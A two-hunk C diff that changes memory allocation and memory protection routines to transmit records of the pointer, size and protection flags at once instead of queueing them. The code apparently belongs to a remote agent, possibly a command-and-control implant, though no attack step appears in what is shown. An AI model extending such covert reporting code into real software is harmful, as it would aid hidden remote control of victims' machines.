@@ -63,7 +63,7 @@ PVOID MemoryAlloc(
             PackageAddPtr( Package, Memory );
             PackageAddInt32( Package, Size );
             PackageAddInt32( Package, Protect );
-            PackageQueue( Package );
+            PackageTransmit( Package );
         }
     } else {
         PackageDestroy( Package );
@@ -135,7 +135,7 @@ BOOL MemoryProtect(
         PackageAddInt32( Package, Size );
         PackageAddInt32( Package, OldProtect );
         PackageAddInt32( Package, Protect );
-        PackageQueue( Package );
+        PackageTransmit( Package );
         Package = NULL;
     }
 
